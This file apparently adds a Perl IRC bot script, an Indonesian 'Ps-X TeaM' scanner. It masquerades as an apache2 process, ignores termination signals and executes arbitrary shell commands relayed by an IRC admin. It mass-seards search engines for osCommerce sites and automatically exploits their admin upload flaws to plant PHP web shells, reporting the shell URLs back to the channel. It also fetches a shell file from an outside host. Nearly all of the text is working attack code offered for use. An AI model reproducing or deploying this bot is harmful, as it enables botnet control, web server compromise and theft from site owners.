@@ -1,0 +1,1380 @@
+#!/usr/bin/perl
+###########################################################################
+#               X-cyb Edited By zens      Ps-X TeaM Network               #
+###############|               Ps-X TeaM                   |###############
+#                       zens Pe'Es-X a.k.a zens                           #
+###########################################################################
+use HTTP::Request;                             #
+use HTTP::Request::Common;                     #
+use HTTP::Request::Common qw(POST);            #
+use LWP::Simple;                               #
+use LWP 5.64;                                  #
+use LWP::UserAgent;                            #
+use Socket;                                    #
+use IO::Socket;                                #
+use IO::Socket::INET;                          #
+use IO::Select;                                #
+use MIME::Base64;			       #
+################################################
+my $datetime = localtime;
+
+my $fakeproc  = "/usr/sbin/apache2 -k start";
+$ircserver = $ARGV[0] unless $ircserver;
+my $ircport   = $ARGV[1];
+my $nickname  = $ARGV[2];
+my $ident     = $ARGV[3];
+my $channel   = '#'.$ARGV[4];
+my $admin     = $ARGV[5];
+
+my $fullname  = "12(4@4 palelupeyang12)";
+my $oscologo   = "12(4@2osco12)12";
+
+my $oscocmd    = 'ngocok';
+
+my $injector  = "http://www.discgotech.com/ca/catalog/admin/includes/graphs/airmata.jpg";
+
+my $engine    = "GooGLe,Bing,WebDe,ALtaViSTa,AsK,UoL,YahOo,SaPo,AmiDalLa,GooCz,GiGabLasT,ReDiFf,RiCerCa,KvaSiR,BusCaR,ExaLead,eXciTe,PaGIna,SeZnaM,CluSty,InteRia,TisCaLi,AoL,SnZ,GooEs,YauSe,WaLLa,HotBot,RambLer,YaNdeX,DmoZ,SzukaCz";
+
+my $uagent    = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12","Mozilla/5.0 (Windows; U; Windows NT 5.1; pl-PL; rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4","Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML,like Gecko) Chrome/9.1.0.0 Safari/540.0","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5","Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1","Opera/9.99 (Windows NT 5.1; U; pl) Presto/9.9.9","Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-HK) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5","Seamonkey-1.1.13-1(X11; U; GNU Fedora fc 10) Gecko/20081112","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; InfoPath.3)';
+
+if (@ARGV == 7) {
+    print "\n[+] Scanner Ps-X TeaM\n".
+          "[+] IRC Host    : $ircserver\n".
+          "[+] IRC Port    : $ircport\n".
+          "[+] Bot Nick    : $nickname\n".
+          "[+] Bot Ident   : $ident\n".
+          "[+] Channel     : $channel\n".
+          "[+] Bot Admin   : $admin\n".
+          "[+] Process/PID : $fakeproc - $$\n\n";
+}
+else {
+    print "\n[USAGE] perl $0 irc.ps-x.net 6667 nick ident chan admin /usr/sbin/fakeproc\n\n";
+    exit();
+}
+
+$SIG{'INT'}   = 'IGNORE';
+$SIG{'HUP'}   = 'IGNORE';
+$SIG{'TERM'}  = 'IGNORE';
+$SIG{'CHLD'}  = 'IGNORE';
+$SIG{'PS'}    = 'IGNORE';
+
+chdir($ARGV[6]);
+$ircserver = "$ARGV[0]" if $ARGV[0];
+$0 = "$fakeproc"."\0" x 16;
+my $pid = fork;
+exit if $pid;
+die "\n[!] Something Wrong !!!: $!\n\n" unless defined($pid);
+
+our %irc_servers;
+our %DCC;
+my $dcc_sel = new IO::Select->new();
+$sel_client = IO::Select->new();
+
+sub sendraw {
+    if ($#_ == '1') {
+    my $socket = $_[0];
+    print $socket "$_[1]\n";
+    } else {
+        print $IRC_cur_socket "$_[0]\n";
+    }
+}
+
+sub connector {
+    my $mynick = $_[0];
+    my $ircserver_con = $_[1];
+    my $ircport_con = $_[2];
+    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
+    if (defined($IRC_socket)) {
+        $IRC_cur_socket = $IRC_socket;
+        $IRC_socket->autoflush(1);
+        $sel_client->add($IRC_socket);
+        $irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
+        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
+        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
+        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
+        nick("$mynick");
+        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
+        sleep 1;
+    }
+}
+
+sub parse {
+    my $servarg = shift;
+    if ($servarg =~ /^PING \:(.*)/) {
+        sendraw("PONG :$1");
+    }
+    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
+        if (lc($1) eq lc($mynick)) {
+            $mynick = $4;
+            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
+        }
+    }
+    elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
+        nick("$mynick".int rand(999));
+    }
+    elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
+        $mynick = $2;
+        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
+        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
+        sendraw("MODE $mynick +Bx");
+        sendraw("JOIN $channel");
+        sleep(1);
+        sendraw("PRIVMSG $channel :edit by airmataNETWORK");
+        sendraw("PRIVMSG $admin :Hi $admin im here !!!");
+    }
+}
+
+my $line_temp;
+while( 1 ) {
+    while (!(keys(%irc_servers))) { connector("$nickname", "$ircserver", "$ircport"); }
+    delete($irc_servers{''}) if (defined($irc_servers{''}));
+    my @ready = $sel_client->can_read(0);
+    next unless(@ready);
+    foreach $fh (@ready) {
+        $IRC_cur_socket = $fh;
+        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
+        $nread = sysread($fh, $ircmsg, 4096);
+        if ($nread == 0) {
+            $sel_client->remove($fh);
+            $fh->close;
+            delete($irc_servers{$fh});
+        }
+        @lines = split (/\n/, $ircmsg);
+        $ircmsg =~ s/\r\n$//;
+
+        if ($ircmsg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
+            my ($nick,$ident,$host,$path,$msg) = ($1,$2,$3,$4,$5);
+            if ($path eq $mynick) {
+                if ($msg =~ /^PING (.*)/) {
+                    sendraw("NOTICE $nick :PING $1");
+                }
+                if ($msg =~ /^VERSION/) {
+                    sendraw("NOTICE $nick :VERSION mIRC v6.21 Khaled Mardam-Bey");
+                }
+                if ($msg =~ /^TIME/) {
+                    sendraw("NOTICE $nick :TIME ".$datetime."");
+                }
+                if (&isAdmin($nick) && $msg eq "!die") {
+                    &shell("$path","kill -9 $$");
+                }
+                if (&isAdmin($nick) && $msg eq "!killall") {
+                    &shell("$path","killall -9 perl");
+                }
+                if (&isAdmin($nick) && $msg eq "!reset") {
+                    sendraw("QUIT :Restarting...");
+                }
+                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
+                    sendraw("JOIN #".$1);
+                }
+                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
+                    sendraw("PART #".$1);
+                }
+                if (&isAdmin($nick) && $msg =~ /^!nick (.+)/) {
+                    sendraw("NICK ".$1);
+                }
+                if (&isAdmin($nick) && $msg =~ /^!pid/) {
+                    sendraw($IRC_cur_socket, "PRIVMSG $nick :Fake Process/PID : $fakeproc - $$");
+                }
+                if (&isAdmin($nick) && $msg !~ /^!/) {
+                    &shell("$nick","$msg");
+                }
+            }
+            else {
+                if (&isAdmin($nick) && $msg eq "!die") {
+                    &shell("$path","kill -9 $$");
+                }
+                if (&isAdmin($nick) && $msg eq "!killall") {
+                    &shell("$path","killall -9 perl");
+                }
+                if (&isAdmin($nick) && $msg eq "!reset") {
+                    sendraw("QUIT :Restarting...");
+                }
+                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
+                    sendraw("JOIN #".$1);
+                }
+                if (&isAdmin($nick) && $msg eq "!part") {
+                    sendraw("PART $path");
+                }
+                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
+                    sendraw("PART #".$1);
+                }
+                if (&isAdmin($nick) && $msg =~ /^\.sh (.*)/) {
+                    &shell("$path","$1");
+                }
+                if (&isAdmin($nick) && $msg =~ /^$mynick (.*)/) {
+                    &shell("$path","$1");
+                }
+
+                ##############################[ HELP COMMAND ]################################# 
+
+                if ($msg=~ /^!help/) {
+                    my $helplogo = "12(4@2Help12)";
+                    &notice("$nick","$helplogo 12osco Vuln Scan:6 $oscocmd [dork]");
+                }
+                if ($msg=~ /^!response/ || $msg=~ /^!id/) {
+                    if (&isFound($injector,"YWlybWF0YSA=")) {
+                        &notice("$nick","12(4@2Injector12)6 PHP Shell is 3BAGUS");
+                    } else {
+                        &notice("$nick","12(4@2Injector12)6 PHP Shell is 4JELEK");
+                    }
+                }
+                if (&isAdmin($nick) && $msg =~ /^!pid/) {
+                    &notice("$nick","6Fake Process/PID : $fakeproc - $$");
+                }
+
+                ##################################################################### OSCO SCAN
+
+                if ($msg=~ /^$oscocmd\s+(.*)/) {
+                    if (my $pid = fork) {
+                        waitpid($pid, 0);
+                    }
+                    else {
+                        if (fork) { exit; } else {
+                            if (&isFound($injector,"YWlybWF0YSA=")) {
+                            my ($bug,$dork) = ("admin/categories.php/login.php?cPath=&action=new_product_preview",$1);
+                            &msg("$path","$oscologo 9Dork :4 $dork");
+                            &msg("$path","$oscologo 8Search Engine Loading ...");
+                            &scan_start($path,$bug,$dork,$engine,1);
+                        } else {
+                            &msg("$path","[ $nick ] $oscologo 4PHP Shell Not Found!");
+                            }
+                        }
+                        exit;
+                    }
+                }
+                ##################################################################### OSCO SCAN
+
+                if ($msg=~ /^$oscocmd\s+(.*)/) {
+                    if (my $pid = fork) {
+                        waitpid($pid, 0);
+                    }
+                    else {
+                        if (fork) { exit; } else {
+                            if (&isFound($injector,"YWlybWF0YSA=")) {
+                            my ($bug,$dork) = ("admin/file_manager.php/login.php",$1);
+                            &msg("$path","$oscologo 9Dork :4 $dork");
+                            &msg("$path","$oscologo 8Search Engine Loading ...");
+                            &scan_start($path,$bug,$dork,$engine,2);
+                         } else {
+                            &msg("$path","[ $nick ] $oscologo 4PHP Shell Not Found!");
+                            }
+                        }
+                        exit;
+                    }
+                }
+                ################################################################################# 
+
+            }
+        }
+
+        for(my $c=0; $c<= $#lines; $c++) {
+            $line = $lines[$c];
+            $line = $line_temp.$line if ($line_temp);
+            $line_temp = '';
+            $line =~ s/\r$//;
+            unless ($c == $#lines) {
+                parse("$line");
+            } else {
+                if ($#lines == 0) {
+                    parse("$line");
+                } elsif ($lines[$c] =~ /\r$/) {
+                    parse("$line");
+                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
+                    parse("$line");
+                } else {
+                    $line_temp = $line;
+                }
+            }
+        }
+    }
+}
+
+###########################################################################
+#                        SYSTEM JALAN EXPLOIT                             #
+###########################################################################
+
+sub type () {
+my ($chan,$bug,$dork,$engine,$type) = @_;
+        if ($type == 1){&osco($chan,$bug,$dork,$engine);}
+        if ($type == 2){&osco2($chan,$bug,$dork,$engine);}
+}
+
+sub scan_start() {
+my ($chan,$bug,$dork,$engine,$type) = @_;
+    if ($engine =~ /google/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"GooGLe",$type);
+        } exit; }
+    }
+
+    if ($engine =~ /bing/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"Bing",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /webde/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"WebDe",$type);
+        } exit; }
+    }
+
+    if ($engine =~ /altavista/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            &type($chan,$bug,$dork,"ALtaViSTa",$type);
+        } exit; }
+    }
+
+    if ($engine =~ /ask/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"AsK",$type);
+        } exit; }
+    }
+
+    if ($engine =~ /uol/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"UoL",$type);
+        } exit; }
+    }
+
+    if ($engine =~ /yahoo/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"YahOo",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /sapo/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"SaPo",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /amidalla/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"AmiDalLa",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /goocz/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"GooCz",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /gigablast/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"GiGabLasT",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /rediff/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"ReDiFf",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /ricerca/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"RiCerCa",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /kvasir/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"KvaSiR",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /buscar/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"BusCaR",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /exalead/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"ExaLead",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /excite/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"eXciTe",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /pagina/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"PaGIna",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /seznam/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"SeZnaM",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /clusty/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"CluSty",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /interia/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"InteRia",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /tiscali/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"TisCaLi",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /aol/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"AoL",$type);
+        } exit; }
+    }
+	if ($engine =~ /snz/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"SnZ",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /gooes/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"GooEs",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /yause/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"YauSe",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /walla/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"WaLLa",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /hotbot/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"HotBot",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /rambler/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"RambLer",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /yandex/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"YaNdeX",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /dmoz/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"DmoZ",$type);
+        } exit; }
+    }
+
+	if ($engine =~ /szukacz/i) {
+        if ($pid = fork) { waitpid($pid, 0); }
+        else { if (fork) { exit; } else {
+            	&type($chan,$bug,$dork,"SzukaCz",$type);
+        } exit; }
+    }
+}
+###########################################################################
+#                        AKTIVITAS EXPLOIT BERJALAN                       #
+###########################################################################
+
+sub osco() {
+    my $chan = $_[0];
+    my $bug = $_[1];
+    my $dork = $_[2];
+    my $engine = $_[3];
+    my $count = 0;
+    my @list = &search_engine($chan,$bug,$dork,$engine,$oscologo);
+    my $num = scalar(@list);
+    if ($num > 0) {
+        foreach my $site (@list) {
+            $count++;
+            if ($count == $num-1) { &msg("$chan","$oscologo(4@2$engine12)2 Scan finish"); }
+            my $test = "http://".$site.$bug;
+            my $html = &get_content($test);
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+            if ($html =~ /Warning: No file uploaded/ ) {
+                &msg("$chan","$oscologo(4@2$engine12)2(4@2System12)13 ".$test);
+				&osco_xpl($test,$chan,$site,$engine);
+				} else { }
+            } exit; sleep(2); }
+        }
+    }
+}
+
+sub osco_xpl() {
+my $browser = LWP::UserAgent->new;
+my $url    = $_[0];
+my $chan   = $_[1];
+my $site   = $_[2];
+my $engine = $_[3];
+my $res = $browser->post( $url,['products_image' => ['./airmata.jpg' => 'users.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
+my $resa = $browser->post( $url,['products_image' => ['./airmata.jpg' => 'cokz.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
+	my $hasil = $res->as_string;
+	my $hasil1 = $resa->as_string;
+	my $check = &get_content("http://".$site."images/users.php");&get_content("http://".$site."images/cokz.php");&get_content("http://".$site."images/cokz.php");&get_content("http://".$site."images/cokz.php");sleep(3);
+	if ($check =~ /airmata - exploit/) {
+	my $safe   ="";
+	my $os     ="";
+	my $free   ="";
+    if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
+    if ($check =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
+    if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}
+    if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}
+	&msg("$chan","$oscologo(4@2$engine12)15(4@9SHeLL15)13,1 http://".$site."images/4config.inc.php 9(4@15SafeMode= $safe9)(4@15OS= $os9)(4@15FreeSpace= $free9)");sleep(2);
+	&msg("$admin","$oscologo(4@9SHeLL15)13 http://".$site."images/4users.php 9(4@15SafeMode= $safe9)");sleep(2);	}
+}
+
+sub osco2() {
+    my $chan = $_[0];
+    my $bug = $_[1];
+    my $dork = $_[2];
+    my $engine = $_[3];
+    my $count = 0;
+    my @list = &search_engine($chan,$bug,$dork,$engine,$oscologo);
+    my $num = scalar(@list);
+    if ($num > 0) {
+        foreach my $site (@list) {
+            $count++;
+            if ($count == $num-1) { &msg("$chan","$oscologo(4@2$engine12)10 Scan finish"); }
+            my $test = "http://".$site.$bug;
+            my $html = &get_content($test);
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+            if ($html =~ /TABLE_HEADING_FILENAME/ ) {
+                 &msg("$chan","$oscologo(4@8$engine15)15(4@2System12)13 ".$test);
+				&osco_xpl2($test,$chan,$site,$engine);
+				} else { }
+            } exit; sleep(2); }
+        }
+    }
+}
+
+sub osco2_xpl() {
+my $browser = LWP::UserAgent->new;
+my $url    = $_[0]."?action=processuploads";
+my $chan   = $_[1];
+my $site   = $_[2];
+my $engine = $_[3];
+my $res = $browser->post( $url,['file_1' => ['./airmata.jpg' => 'users.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
+my $resa = $browser->post( $url,['file_1' => ['./airmata.jpg' => 'cokz.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
+	my $hasil = $res->as_string;
+	my $hasil1 = $resa->as_string;
+	my $check = &get_content("http://".$site."images/users.php");&get_content("http://".$site."images/cokz.php");&get_content("http://".$site."images/cokz.php");&get_content("http://".$site."images/cokz.php");sleep(3);
+	if ($check =~ /airmata - exploit/) { 
+	my $safe   ="";
+	my $os 	   ="";
+	my $free   ="";
+    if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
+    if ($check =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
+    if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}
+    if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}
+	&msg("$chan","$oscologo(4@2$engine12)15(4@9SHeLL15)13 http://".$site."images/4config.inc.php 9(4@15SafeMode= $safe9)(4@15OS= $os9)(4@15FreeSpace= $free9)");sleep(2);
+	&msg("$admin","$oscologo(4@9SHeLL15)13 http://".$site."images/4users.php 9(4@15SafeMode= $safe9)");sleep(2);
+	}
+}
+
+###########################################################################
+#                           PERJALANAN PER ENGINE                         #
+###########################################################################
+
+sub search_engine() {
+    my (@total,@clean);
+    my $chan = $_[0];
+    my $bug = $_[1];
+    my $dork = $_[2];
+    my $engine = $_[3];
+    my $logo = $_[4];
+    if ($engine eq "GooGLe") { my @google = google($dork); push(@total,@google); }
+    if ($engine eq "Bing") { my @bing = bing($dork); push(@total,@bing); }
+	if ($engine eq "WebDe") { my @webde = webde($dork); push(@total,@webde); }
+    if ($engine eq "ALtaViSTa") { my @altavista = altavista($dork); push(@total,@altavista); }
+    if ($engine eq "AsK") { my @ask = ask($dork); push(@total,@ask); }
+    if ($engine eq "UoL") { my @uol = uol($dork); push(@total,@uol); }
+    if ($engine eq "YahOo") { my @yahoo = yahoo($dork); push(@total,@yahoo); }
+	if ($engine eq "SaPo") { my @sapo = sapo($dork); push(@total,@sapo); }
+	if ($engine eq "AmiDalLa") { my @amidalla = amidalla($dork); push(@total,@amidalla); }
+	if ($engine eq "GooCz") { my @goocz = goocz($dork); push(@total,@goocz); }
+	if ($engine eq "GiGabLasT") { my @gigablast = gigablast($dork); push(@total,@gigablast); }
+	if ($engine eq "ReDiFf") { my @rediff = rediff($dork); push(@total,@rediff); }
+	if ($engine eq "RiCerCa") { my @ricerca = ricerca($dork); push(@total,@ricerca); }
+	if ($engine eq "KvaSiR") { my @kvasir = kvasir($dork); push(@total,@kvasir); }
+	if ($engine eq "BusCaR") { my @buscar = buscar($dork); push(@total,@buscar); }
+	if ($engine eq "ExaLead") { my @exalead = exalead($dork); push(@total,@exalead); }
+	if ($engine eq "eXciTe") { my @excite = excite($dork); push(@total,@excite); }
+	if ($engine eq "PaGIna") { my @pagina = pagina($dork); push(@total,@pagina); }
+	if ($engine eq "SeZnaM") { my @seznam = seznam($dork); push(@total,@seznam); }
+	if ($engine eq "CluSty") { my @clusty = &clusty($dork); push(@total,@clusty); }
+	if ($engine eq "InteRia") { my @interia = &interia($dork); push(@total,@interia); }
+	if ($engine eq "TisCaLi") { my @tiscali = &tiscali($dork); push(@total,@tiscali); }
+	if ($engine eq "AoL") { my @aol = &aol($dork); push(@total,@aol); }
+	if ($engine eq "SnZ") { my @snz = snz($dork); push(@total,@snz); }
+	if ($engine eq "GooEs") { my @gooes = gooes($dork); push(@total,@gooes); }
+	if ($engine eq "YauSe") { my @yause = &yause($dork); push(@total,@yause); }
+	if ($engine eq "WaLLa") { my @walla = &walla($dork); push(@total,@walla); }
+	if ($engine eq "HotBot") { my @hotbot = &hotbot($dork); push(@total,@hotbot); }
+	if ($engine eq "RambLer") { my @rambler = &rambler($dork); push(@total,@rambler); }
+	if ($engine eq "YaNdeX") { my @yandex = &yandex($dork); push(@total,@yandex); }
+	if ($engine eq "DmoZ") { my @dmoz = &dmoz($dork); push(@total,@dmoz); }
+	if ($engine eq "SzukaCz") { my @szukacz = &szukacz($dork); push(@total,@szukacz); }
+    @clean = clean(@total);
+    &msg("$chan","$logo(4@2$engine12)2 Total:2 (".scalar(@total).")2 Clean:2 (".scalar(@clean).")");
+    return @clean;
+}
+
+###########################################################################
+#               X-cyb Edited By zens      Ps-X TeaM Network               #
+###########################################################################
+
+sub rce_os() {
+    my $sys = "";
+    my $url = $_[0];
+    my $chk = get_content($url);
+    $chk =~ s/\n//;
+    if ($chk =~ /999(.*)666/sg) { $sys = $1; }
+    return $sys;
+}
+
+sub isFound() {
+    my $status = 0;
+    my $link = $_[0];
+    my $reqexp = $_[1];
+    my $res = get_content($link);
+    if ($res =~ /$reqexp/) { $status = 1 }
+    return $status;
+}
+
+sub get_content() {
+    my $url = $_[0];
+    my $ua = LWP::UserAgent->new(agent => $uagent);
+    $ua->timeout(10);
+    my $req = HTTP::Request->new(GET => $url);
+    my $res = $ua->request($req);
+    return $res->content;
+}
+
+###########################################################################
+#                              SEARCH ENGINE                              #
+###########################################################################
+
+
+sub google() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=0; $i<=1000; $i+=100){
+        my $search = ("http://www.google.com/search?q=".key($key)."&num=100&filter=0&start=".$i);
+        my $res = search_engine_query($search);
+        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
+            my $link = $1;
+            if ($link !~ /google/){
+                my @grep = links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub bing() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=1; $i<=1000; $i+=10) {
+        my $search = ("http://www.bing.com/search?q=".key($key)."&filt=all&first=".$i."&FORM=PERE");
+        my $res = search_engine_query($search);
+        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
+            my $link = $1;
+            if ($link !~ /msn|live|bing/) {
+                my @grep = links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub webde() {
+    my @list;
+    my $key = $_[0];
+    for ($i=0; $i<=1000; $i+=10){
+        my $web=("http://suche.web.de/search/web/?pageIndex=".$i."&su=".key($key)."&origin=HP&mc=suche@web@navigation@zahlen.suche@web");		
+        my $Res= search_engine_query($web);
+        while ($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
+            if ($1 !~ /webde/){
+                my $k=$1;
+                my @grep=links($k);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub altavista() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=1; $i<=1000; $i+=10){
+        my $search = ("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$i);
+        my $res = search_engine_query($search);
+        while ($res =~ m/<span class=ngrn>(.+?)\//g) {
+            my $link = $1;
+            if ($link !~ /altavista/){
+                $link =~ s/<//g;
+                $link =~ s/ //g;
+                my @grep = links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub ask() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=0; $i<=1000; $i+=10) {
+        my $search = ("http://it.ask.com/web?q=".key($key)."&o=0&l=dir&qsrc=0&qid=EE90DE6E8F5370F363A63EC61228D4FE&dm=all&page=".$i);
+        my $res = search_engine_query($search);
+        while ($res =~ m/href=\"http:\/\/(.+?)\" onmousedown=/g) {
+            my $link = $1;
+            if ($link !~ /ask\.com/){
+                my @grep = links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
